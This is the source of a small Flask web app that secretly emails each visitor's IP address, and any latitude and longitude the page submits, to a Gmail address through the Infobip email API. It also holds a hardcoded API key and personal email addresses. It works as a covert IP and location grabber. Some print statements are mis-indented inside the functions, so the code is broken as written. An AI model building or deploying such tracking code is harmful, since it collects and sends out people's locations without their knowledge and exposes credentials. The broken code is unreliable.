from flask import Flask, request
import requests

app = Flask(__name__)
 #app.config['DEBUG'] = True

@app.route('/')
def index():
    # Send the IP address to Gmail
    send_ip_to_gmail(request.remote_addr)

    # Render the index.html page
    return app.send_static_file('index.html')

@app.route('/location', methods=['POST'])
def location():
    # Parse the location data from the request body
    lat = request.form['latitude']
    lon = request.form['longitude']

    # Send the IP and location data to Gmail
    send_location_to_gmail(request.remote_addr, lat, lon)

    # Return a response to the client
    return 'Location received successfully.'

def send_ip_to_gmail(ip):
    # Set up the email parameters
    BASE_URL = "https://nz3x68.api.infobip.com"
    API_KEY = "App 1c324f190303bfaa25163865179285b6-cc9f31d7-4383-40f7-9b10-de318fb4c44d"
    SENDER_EMAIL = "01028838444a@selfserviceib.com"
    RECIPIENT_EMAIL = "01028838444a@gmail.com"
    EMAIL_SUBJECT = "Client IP Address"
    EMAIL_TEXT = "The client IP address is: " + ip

    form_data = {
        "from": SENDER_EMAIL,
        "to": RECIPIENT_EMAIL,
        "subject": EMAIL_SUBJECT,
        "text": EMAIL_TEXT
    }

    all_headers = {
        "Authorization": API_KEY
    }

    response = requests.post(BASE_URL + "/email/3/send", data=form_data, headers=all_headers)
print("Status Code: " + str(response.status_code))
print(response.json())



    return response.json()

def send_location_to_gmail(ip, lat, lon):
    # Set up the email parameters
    BASE_URL = "https://nz3x68.api.infobip.com"
    API_KEY = "App 1c324f190303bfaa25163865179285b6-cc9f31d7-4383-40f7-9b10-de318fb4c44d"
    SENDER_EMAIL = "01028838444a@selfserviceib.com"
    RECIPIENT_EMAIL = "01028838444a@gmail.com"
    EMAIL_SUBJECT = "Client Location"
    EMAIL_TEXT = "The client IP address is: " + ip + "\n" + \
                  "The client location is: " + str(lat) + ", " + str(lon)

    form_data = {
        "from": SENDER_EMAIL,
        "to": RECIPIENT_EMAIL,
        "subject": EMAIL_SUBJECT,
        "text": EMAIL_TEXT
    }

    all_headers = {
        "Authorization": API_KEY
    }

    response = requests.post(BASE_URL + "/email/3/send", data=form_data, headers=all_headers)

 
print("Status Code: " + str(response.status_code))
print(response.json())

    return response.json()

if __name__ == '__main__':
    app.run()
